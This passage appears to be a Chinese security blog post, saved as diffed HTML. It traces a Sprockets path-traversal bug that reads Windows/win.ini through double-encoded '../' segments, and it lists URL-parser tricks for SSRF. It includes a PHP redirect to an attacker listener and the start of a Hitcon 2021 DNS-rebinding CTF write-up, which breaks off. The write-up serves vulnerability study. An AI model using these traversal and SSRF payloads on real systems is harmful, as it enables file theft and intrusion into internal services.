+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">UnloadedAsset&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">initialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">env&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">@uri&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">to_s&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">@env&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">env&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">@compressed_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">URITar&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">env&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">compressed_path&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">@params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#75715e"># lazy loaded&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">@filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">nil&lt;/span> &lt;span style="color:#75715e"># lazy loaded 具体实现见下面&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Internal: Full file path without schema&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># This returns a string containing the full path to the asset without the schema.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Information is loaded lazilly since we want `UnloadedAsset.new(dep, self).relative_path`&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># to be fast. Calling this method the first time allocates an array and a hash.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Example&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># If the URI is `file:///Full/path/app/assets/javascripts/application.js&amp;#34;` then the&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># filename would be `&amp;#34;/Full/path/app/assets/javascripts/application.js&amp;#34;`&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Returns a String.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 由于采用了Lazy loaded，当第一次访问到filename这个属性时，会调用下面这个方法&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">filename&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unless&lt;/span> &lt;span style="color:#111">@filename&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">load_file_params&lt;/span> &lt;span style="color:#75715e"># 跟进去，见下&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">@filename&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 第 130 行&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Internal: Parses uri into filename and params hash&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Returns Array with filename and params hash&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_file_params&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># uri 为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">@filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">@params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">URIUtils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse_asset_uri&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>跟入&lt;code>URIUtils.parse_asset_uri&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">parse_asset_uri&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># uri 为 file:///C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 跟进 split_file_uri&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">scheme&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">query&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">split_file_uri&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parse_uri_query_params&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">...&lt;/span>&lt;span style="color:#75715e"># 省略&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">split_file_uri&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">scheme&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">_&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">query&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">_&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">URI&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">uri&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 此时解析出的几个变量如下：&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># scheme: file&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># host:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># path: /C:/chybeta/blog/app/assets/config/%2e%2e/%2e./%2e./%2e./%2e./%2e./%2e./Windows/win.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># query:&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">URI&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#00a8c8">Generic&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#00a8c8">DEFAULT_PARSER&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">unescape&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 这里经过第二次的url解码&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># path：/C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">force_encoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">Encoding&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#00a8c8">UTF_8&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Hack for parsing Windows &amp;#34;file:///C:/Users/IEUser&amp;#34; paths&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">gsub!&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/^\/([a-zA-Z]:)/&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;\1&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">freeze&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># path: C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">scheme&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">query&lt;/span>&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://xzfile.aliyuncs.com/media/upload/picture/20180808122707-4f8e0bce-9ac3-1.png" alt="5.png">&lt;/p>
+&lt;p>在完成了filename解析后，我们回到&lt;code>load&lt;/code>函数末尾，进入&lt;code>load_from_unloaded(unloaded)&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Internal: Loads an asset and saves it to cache&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># unloaded - An UnloadedAsset&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># This method is only called when the given unloaded asset could not be&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># successfully pulled from cache.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_from_unloaded&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">unloaded&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unless&lt;/span> &lt;span style="color:#111">file?&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">unloaded&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#00a8c8">FileNotFound&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;could not find file: &lt;/span>&lt;span style="color:#d88200">#{&lt;/span>&lt;span style="color:#111">unloaded&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">load_path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">logical_path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">paths_split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#d88200">:paths&lt;/span>&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">unloaded&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">unless&lt;/span> &lt;span style="color:#111">load_path&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#00a8c8">FileOutsidePaths&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">#{&lt;/span>&lt;span style="color:#111">unloaded&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> is no longer under a load path: &lt;/span>&lt;span style="color:#d88200">#{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;, &amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">....&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>主要是进行了两个检查：文件是否存在和是否在合规目录里。主要关注第二个检测。其中&lt;code>config[:paths]&lt;/code>是允许的路径，而&lt;code>unloaded.filename&lt;/code>是请求的路径文件名。跟入 lib/ruby/gems/2.4.0/gems/sprockets-3.7.2/lib/sprockets/path_utils.rb:120：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ruby" data-lang="ruby">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Internal: Detect root path and base for file in a set of paths.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># paths - Array of String paths&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># filename - String path of file expected to be in one of the paths.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Returns [String root, String path]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">paths_split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">paths&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 对paths中的每一个 path&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">paths&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">each&lt;/span> &lt;span style="color:#00a8c8">do&lt;/span> &lt;span style="color:#f92672">|&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#f92672">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 如果subpath不为空&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">split_subpath&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># 则返回 path, subpath&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">path&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">subpath&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">nil&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">end&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>继续跟入&lt;code>split_subpath&lt;/code>， lib/ruby/gems/2.4.0/gems/sprockets-3.7.2/lib/sprockets/path_utils.rb:103&lt;/p>
+&lt;pre tabindex="0">&lt;code># Internal: Get relative path for root path and subpath.
+#
+# path - String path
+# subpath - String subpath of path
+#
+# Returns relative String path if subpath is a subpath of path, or nil if
+# subpath is outside of path.
+def split_subpath(path, subpath)
+return &amp;#34;&amp;#34; if path == subpath
+# 此时 path 为 C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini
+path = File.join(path, &amp;#39;&amp;#39;)
+# 此时 path 为 C:/chybeta/blog/app/assets/config/../../../../../../../Windows/win.ini/
+# 与传入的绝对路径进行比较
+# 如果以 允许的路径 为开头，则检查通过。
+if subpath.start_with?(path)
+subpath[path.length..-1]
+else
+nil
+end
+end
+&lt;/code>&lt;/pre>&lt;p>通过检查后，在&lt;code>load_from_unloaded&lt;/code>末尾即进行了读取等操作，从而通过路径穿越造成任意文件读取。&lt;/p>
+&lt;p>如果文件以&lt;code>.erb&lt;/code>结尾，则会直接执行&lt;/p>
+&lt;h2 id="c">C#&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="http://www.baidu.com@www.xcao.vip@www.qq.com">http://www.baidu.com@www.xcao.vip@www.qq.com&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>无法解析host，即不能再host中出现&lt;code>\&lt;/code>，但是path部分可以 并且自动转换为&lt;code>/&lt;/code>，也会把10进制ip转换为正常格式ip&lt;/p>
+&lt;ul>
+&lt;li>xcao.vip://www.baidu.com/../index.php&lt;/li>
+&lt;/ul>
+&lt;p>host会被识别为后者，但是webrequest和httpclient访问都会失败（与php的parse_url不同）&lt;/p>
+&lt;h2 id="语言部分小结">语言部分小结&lt;/h2>
+&lt;ol>
+&lt;li>&lt;a href="http://www.baidu.com@www.xcao.vip@www.qq.com">http://www.baidu.com@www.xcao.vip@www.qq.com&lt;/a>&lt;/li>
+&lt;/ol>
+&lt;p>java和c#解析函数识别host为null，php和浏览器识别为www.qq.com&lt;/p>
+&lt;ol start="2">
+&lt;li>&lt;a href="http://www.xcao.vip">http://www.xcao.vip&lt;/a>@www.baidu.com/index.php&lt;/li>
+&lt;/ol>
+&lt;p>c#解析报错，java和PHPhost识别为www.baidu.com，其中php的curl还可以访问成功，但是浏览器识别为www.xcao.vip存在xss，jsonp风险&lt;/p>
+&lt;ol start="3">
+&lt;li>&lt;a href="https://www.qq.com">www.qq.com&lt;/a>://www.baidu.com/../index.php&lt;/li>
+&lt;/ol>
+&lt;p>java解析报错，c#和php pase_url识别为www.baidu.com，但是curl访问又识别为www.qq.com，存在ssrf风险（127.0.0.1://www.baidu.com/../index.php）&lt;/p>
+&lt;ol start="4">
+&lt;li>http://127.0.0.1:80xx/file/flag.php&lt;/li>
+&lt;/ol>
+&lt;p>只有java的httpclient4和php的curl可以正确访问，其他的都报端口错误，但是 curl 只需要 port 部分最多5个字符&lt;/p>
+&lt;ol start="5">
+&lt;li>对host编码，http://127.0.0.1%253a80%253f.xcao.vip/file/flag.php&lt;/li>
+&lt;/ol>
+&lt;p>只有java的httpclient3和httpclient4可以正常访问 ，识别为127.0.0.1:80/file/flag.php&lt;/p>
+&lt;h2 id="重定向ssrf">重定向&amp;amp;SSRF&lt;/h2>
+&lt;ul>
+&lt;li>php&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">header&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Location: http://192.168.1.142:4444/attack?arbitrary=params&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="hitcon-2021vulpixelize">[Hitcon 2021]Vulpixelize&lt;/h3>
+&lt;p>题目是这样的，可以访问url并返回对应的网页截图，http://localhost/flag就是flag，但是截图会有很多马赛克无法处理&lt;/p>
+&lt;p>我们利用DNS重绑定的方式，将一个域名解析为两个ip，一个是内网的127.0.0.1，另一个ip是我们自己搭的恶意server&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.html&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
